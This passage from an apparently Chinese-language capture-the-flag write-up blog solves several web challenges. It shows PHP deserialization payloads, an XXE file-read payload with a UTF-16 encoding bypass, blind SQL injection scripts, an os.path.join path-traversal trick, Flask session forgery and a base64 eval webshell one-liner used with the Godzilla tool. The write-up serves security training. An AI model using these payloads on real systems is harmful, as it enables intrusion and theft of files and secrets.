  <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])); </span><br></pre></td></tr></table></figure><p>php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">date</span>(<span class="string">&quot;/f\l\a\g&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#/flag</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$content=date($this-&gt;file);</span><br><span class="line"></span><br><span class="line">#  $content接受经过被date函数格式化后的变量file</span><br><span class="line">#date()的说明：</span><br><span class="line">#该方法会检测传入的字符串中是否有特定的格式化字符，如Y（年份）、m（月份）、d（天）、H（时）、i（分钟）、s（秒）等</span><br><span class="line">#    检测存在则会将格式化字符替换为当前时间的对应部分，否则将字符进行原样输出，同时可用转义字符将格式化字符原样输出</span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;/f\l\a\g&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">date</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h2 id="NISACTF-2022-babyupload"><a href="#NISACTF-2022-babyupload" class="headerlink" title="[NISACTF 2022]babyupload"></a>[NISACTF 2022]babyupload</h2><p>打开后出现了一个简单的文件上传界面，查看一下源码，发现hint为&#x2F;source，访问一下获得源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, g, send_from_directory</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SCHEMA = <span class="string">&quot;&quot;&quot;CREATE TABLE files (</span></span><br><span class="line"><span class="string">id text primary key,</span></span><br><span class="line"><span class="string">path text</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    g_db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> g_db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        g_db = g._database = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> g_db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>():</span><br><span class="line">    os.remove(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    cur = db().cursor()</span><br><span class="line">    cur.executescript(SCHEMA)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">    Select image to upload:</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /source --&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(directory=<span class="string">&quot;/var/www/html/&quot;</span>, path=<span class="string">&quot;www.zip&quot;</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone()</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(res[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进行常规的代码审计，发现上传的文件名不能有点，那么上传木马啥的就不存在了，因为解析不了，挺安全的，但我们接着往下看，上传文件后会获得一个uuid并将uuid和filename一起存入数据库，在file目录下可以查询上传的文件，在file函数中有一个重要的利用点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.path.join</span><br></pre></td></tr></table></figure><p>打开uploads目录下的文件并读取内容，然后return。此处存在绝对路径拼接漏洞！！！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">绝对路径拼接漏洞</span><br><span class="line"></span><br><span class="line">os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。</span><br><span class="line"></span><br><span class="line">然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</span><br></pre></td></tr></table></figure><p>因此，如果我们上传&#x2F;flag，那么uploads将被删除，直接读取&#x2F;flag下的内容，那就拿捏了！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202091606567.png" alt="image-20241202091606567"></p><p>然后访问file下即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;0aff3bd4-26ba-4b76-bf5c-36bf2eb5e175&#125;</span><br></pre></td></tr></table></figure><h2 id="CSAWQual-2019-Unagi"><a href="#CSAWQual-2019-Unagi" class="headerlink" title="[CSAWQual 2019]Unagi"></a>[CSAWQual 2019]Unagi</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093801748.png" alt="image-20241202093801748" style="zoom: 80%;" /><p>点击here后显示如下：</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093817078.png" alt="image-20241202093817078" style="zoom:67%;" /><p>同时题目告诉我们flag在&#x2F;flag，那么xxe拿捏了。</p><p>上传xml即可，但是上传后发现存在waf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE users [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span><br><span class="line">&lt;users&gt; </span><br><span class="line">  &lt;user&gt;</span><br><span class="line">   &lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">   &lt;password&gt;&amp;xxe;&lt;/password&gt;</span><br><span class="line">   &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">   &lt;email&gt;&amp;xxe;&lt;/email&gt;</span><br><span class="line">   &lt;group&gt;&amp;xxe;&lt;/group&gt;</span><br><span class="line">   &lt;intro&gt;&amp;xxe;&lt;/intro&gt;</span><br><span class="line">  &lt;/user&gt;</span><br><span class="line">&lt;/users&gt; </span><br></pre></td></tr></table></figure><p>那就编码转换一下，简单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f UTF-8 -t UTF-16BE 1.xml &gt; 2.xml</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093953244.png" alt="image-20241202093953244" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;b4784f04-d534-46f9-adee-431ea58cb80a&#125;</span><br></pre></td></tr></table></figure><h2 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h2><p>布尔盲注，这里就简单地贴两个脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28299/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">min</span>&lt;<span class="built_in">max</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url= url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span>=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=mid</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">min</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># buuctf web Hack World</span></span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> right</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28299/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    letf = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> letf &lt; right:</span><br><span class="line">        mid = (letf + right) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            letf = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">if</span> letf != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(letf)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="CISCN-2019华东南-Web11"><a href="#CISCN-2019华东南-Web11" class="headerlink" title="[CISCN 2019华东南]Web11"></a>[CISCN 2019华东南]Web11</h2><p><strong>考点smarty ssti</strong></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113409968.png" alt="image-20241202113409968"></p><p>Smarty模板，不出意外应该就是ssti</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113436817.png" alt="image-20241202113436817"></p><p>ssti确定了</p><blockquote><p>在这里有两个知识点：</p><ol><li>Smarty支持使用{php}{&#x2F;php}标签来执行被包裹其中的php指令</li><li>XFF头代表了HTTP的请求端真实的IP，通过修改XXF头可以实现伪造IP</li></ol></blockquote><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113745659.png" alt="image-20241202113745659"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113809806.png" alt="image-20241202113809806"></p><h2 id="FSCTF-2023-是兄弟，就来传你の🐎！"><a href="#FSCTF-2023-是兄弟，就来传你の🐎！" class="headerlink" title="[FSCTF 2023]是兄弟，就来传你の🐎！"></a>[FSCTF 2023]是兄弟，就来传你の🐎！</h2><p>考察文件上传，对后缀，内容长度，文件头，内容进行了过滤，最终payload如下：</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202120310235.png" alt="image-20241202120310235"></p><blockquote><p>BM与GIF89a一样可以作为文件头，bm是bmp的</p><p>短标签不用闭合！！！</p></blockquote><h2 id="NSSRound-13-Basic-flask-jwt"><a href="#NSSRound-13-Basic-flask-jwt" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?"></a>[NSSRound#13 Basic]flask?jwt?</h2><p>本质上是一道非常简单的session伪造题</p><p>但是在使用脚本时出现了一些问题导致一直报错，这里阐述一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;th3f1askisfunny&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True,&#x27;_i</span><br><span class="line">d&#x27;: &#x27;323e553274b92d78b97cec1e6057e2d1e427da85e1e1d30ab94c690b84cea27289a62d7bfece7c28411e7440095785ba82b839cb6355dad9068</span><br><span class="line">bdd3f73b6aac8&#x27;,&#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><p>要注意的是这里的True不能为true，同时要注意一些空格，值前要有一个空格。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202135053653.png" alt="image-20241202135053653"></p><p>错误示例如上</p><h2 id="GKCTF-2020-CheckIN"><a href="#GKCTF-2020-CheckIN" class="headerlink" title="[GKCTF 2020]CheckIN"></a>[GKCTF 2020]CheckIN</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$decode</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;code = @<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">x</span>()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;decode = @<span class="title function_ invoke__">base64_decode</span>( <span class="variable">$this</span>-&gt;code );</span><br><span class="line">                @<span class="title function_ invoke__">Eval</span>(<span class="variable">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ClassName</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node4.anna.nssctf.cn:28768?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure><p>搞一个一句话木马就好，放哥斯拉上面</p><p>发现执行不了命令，存在disable_function，可以用插件来绕过</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202141718720.png" alt="image-20241202141718720"></p><h2 id="NCTF-2018-Easy-Audit"><a href="#NCTF-2018-Easy-Audit" class="headerlink" title="[NCTF 2018]Easy_Audit"></a>[NCTF 2018]Easy_Audit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/yulige|flag|nctf/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  <span 